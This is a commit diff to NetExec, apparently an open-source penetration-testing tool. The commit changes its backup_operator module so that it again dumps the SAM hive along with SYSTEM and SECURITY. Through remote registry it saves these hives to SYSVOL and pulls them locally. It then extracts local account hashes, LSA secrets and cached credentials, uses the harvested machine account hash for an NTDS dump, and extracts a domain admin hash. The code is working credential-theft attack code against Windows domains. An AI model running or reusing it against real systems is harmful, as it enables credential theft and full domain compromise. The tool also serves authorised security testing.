0e80de5d68f67d88dcbd5f012200064c2da52ade
T1erno <Erickdeveloper2000@outlook.com>
2026-07-04 21:19:14 -0600

    reintroduced samdump in backup operator

--- nxc/modules/backup_operator.py
+++ nxc/modules/backup_operator.py
@@ -1,6 +1,7 @@
 import contextlib
+from time import sleep
 
-from impacket.examples.secretsdump import LSASecrets, LocalOperations
+from impacket.examples.secretsdump import SAMHashes, LSASecrets, LocalOperations
 from impacket.smbconnection import SessionError
 from impacket.dcerpc.v5 import rrp
 from nxc.helpers.misc import CATEGORY, gen_random_string
@@ -16,8 +17,12 @@ class NXCModule:
     def __init__(self, context=None, module_options=None):
         self.context = context
         self.module_options = module_options
+        self.local_admin = None
+        self.local_admin_hash = None
         self.machine_account = None
         self.machine_account_hash = None
+        self.cleanup_user = None
+        self.cleanup_hash = None
 
     def options(self, context, module_options):
         """NO OPTIONS"""
@@ -32,26 +37,40 @@ class NXCModule:
         dce = NXCRPCConnection(connection).connect(r"\winreg", rrp.MSRPC_UUID_RRP)
 
         try:
-            for hive in ["HKLM\\SYSTEM", "HKLM\\SECURITY"]:
+            for hive in ["HKLM\\SAM", "HKLM\\SYSTEM", "HKLM\\SECURITY"]:
                 hRootKey, subKey = self._strip_root_key(dce, hive)
                 outputFileName = f"\\\\{connection.host}\\SYSVOL\\{subKey}_{rand_suffix}"
-                context.log.debug(f"Dumping {hive}...")
-                ans2 = rrp.hBaseRegOpenKey(dce, hRootKey, subKey, dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK, samDesired=rrp.KEY_READ)
-                rrp.hBaseRegSaveKey(dce, ans2["phkResult"], outputFileName)
-                context.log.highlight(f"Saved {hive} to {outputFileName}")
-        except Exception as e:
-            context.log.fail(f"Unexpected error during hive dump: {e}")
+                context.log.debug(f"Dumping {hive}, be patient it can take a while for large hives (e.g. HKLM\\SYSTEM)")
+                try:
+                    ans2 = rrp.hBaseRegOpenKey(dce, hRootKey, subKey, dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK, samDesired=rrp.KEY_READ)
+                    rrp.hBaseRegSaveKey(dce, ans2["phkResult"], outputFileName)
+                    context.log.highlight(f"Saved {hive} to {outputFileName}")
+                except Exception as e:
+                    context.log.fail(f"Couldn't save {hive}: {e} on path {outputFileName}")
+                    return
+        except (Exception, KeyboardInterrupt) as e:
+            context.log.fail(f"Unexpected error: {e}")
             return
         finally:
             with contextlib.suppress(Exception):
                 dce.disconnect()
 
-        # copy remote files to local
-        for hive in ["SECURITY", "SYSTEM"]:
-            connection.get_file_single(f"{hive}_{rand_suffix}", f"{connection.output_filename}.{hive}")
+        # copy remote file to local
+        log_path = f"{connection.output_filename}."
+        for hive in ["SAM", "SECURITY", "SYSTEM"]:
+            connection.get_file_single(f"{hive}_{rand_suffix}", log_path + hive)
 
         # read local file
         try:
+            def parse_sam(secret):
+                context.log.highlight(secret)
+                if not self.local_admin:
+                    first_line = secret.strip().splitlines()[0]
+                    fields = first_line.split(":")
+                    if len(fields) >= 4:
+                        self.local_admin = fields[0]
+                        self.local_admin_hash = fields[3]
+
             def parse_lsa(secret_type, secret):
                 context.log.highlight(secret)
                 for line in secret.splitlines():
@@ -62,35 +81,31 @@ class NXCModule:
                             self.machine_account = account_name
                             self.machine_account_hash = fields[2]
 
-            local_path = f"{connection.output_filename}."
-            local_operations = LocalOperations(local_path + "SYSTEM")
+            local_operations = LocalOperations(log_path + "SYSTEM")
             boot_key = local_operations.getBootKey()
+            sam_hashes = SAMHashes(log_path + "SAM", boot_key, isRemote=False, perSecretCallback=parse_sam)
+            sam_hashes.dump()
+            sam_hashes.finish()
 
-            LSA = LSASecrets(local_path + "SECURITY", boot_key, None, isRemote=False, perSecretCallback=parse_lsa)
+            LSA = LSASecrets(log_path + "SECURITY", boot_key, None, isRemote=False, perSecretCallback=parse_lsa)
             LSA.dumpCachedHashes()
             LSA.dumpSecrets()
         except Exception as e:
-            context.log.fail(f"Fail to dump the lsa: {e!s}")
+            context.log.fail(f"Fail to dump the sam and lsa: {e!s}")
 
         # Attempt NTDS dump with DC Machine Account
-        cleanup_user, cleanup_hash = None, None
         if self._try_dump_ntds(connection, context, self.machine_account, self.machine_account_hash):
-            cleanup_user, cleanup_hash = self._extract_da_hash(connection.output_filename, context)
-            if not cleanup_user or not cleanup_hash:
-                # Fallback to cleaning up using the machine account if DA could not be extracted
-                cleanup_user, cleanup_hash = self.machine_account, self.machine_account_hash
+            self.cleanup_user, self.cleanup_hash = self._extract_da_hash(connection.output_filename, context)
+            if not self.cleanup_user or not self.cleanup_hash:
+                self.cleanup_user = self.machine_account
+                self.cleanup_hash = self.machine_account_hash
 
-        # Final Cleanup using native SMB deleteFile
-        if cleanup_user and cleanup_hash:
-            self._perform_cleanup(connection, context, cleanup_user, cleanup_hash, rand_suffix)
+            self._perform_cleanup(connection, context, self.cleanup_user, self.cleanup_hash, rand_suffix)
         else:
             context.log.fail("Failed to obtain suitable credentials for NTDS dump or cleanup.")
             self._print_cleanup_warning(context, rand_suffix)
 
     def _try_dump_ntds(self, connection, context, username, user_hash):
-        if not username or not user_hash:
-            return False
-        context.log.display(f"Attempting NTDS dump with: {username}")
         with contextlib.suppress(Exception):
             connection.conn.logoff()
         connection.create_conn_obj()
@@ -110,7 +125,7 @@ class NXCModule:
         connection.create_conn_obj()
         if connection.hash_login(connection.domain, username, user_hash):
             context.log.display(f"Cleaning dump with user {username} on domain {connection.domain}")
-            hives = ["SECURITY", "SYSTEM"]
+            hives = ["SAM", "SECURITY", "SYSTEM"]
             all_deleted = True
             for hive in hives:
                 remote_name = f"{hive}_{rand_suffix}"
@@ -124,7 +139,6 @@ class NXCModule:
                     if "STATUS_ACCESS_DENIED" in str(e):
                         context.log.debug(f"SMB deleteFile for {remote_name} got access denied. Attempting deletion via cmd execution...")
                         try:
-                            # Attempt to delete via execute command if direct SMB share delete gets ACCESS_DENIED
                             connection.execute(f"del C:\\Windows\\sysvol\\sysvol\\{remote_name}")
                             continue
                         except Exception as exec_err:
@@ -133,7 +147,6 @@ class NXCModule:
                     context.log.fail(f"Fail to remove the file {remote_name}: {e!s}")
 
             if all_deleted:
-                # Double check that files are gone
                 double_check = True
                 for hive in hives:
                     remote_name = f"{hive}_{rand_suffix}"
@@ -163,7 +176,7 @@ class NXCModule:
         return None, None
 
     def _print_cleanup_warning(self, context, rand_suffix):
-        context.log.fail(f"Files were not automatically deleted. Please clean up manually: C:\\Windows\\sysvol\\sysvol\\SECURITY_{rand_suffix}, SYSTEM_{rand_suffix}")
+        context.log.fail(f"Files were not automatically deleted. Please clean up manually: C:\\Windows\\sysvol\\sysvol\\SECURITY_{rand_suffix}, SAM_{rand_suffix}, SYSTEM_{rand_suffix}")
 
     def _strip_root_key(self, dce, key_name):
         # Let's strip the root key
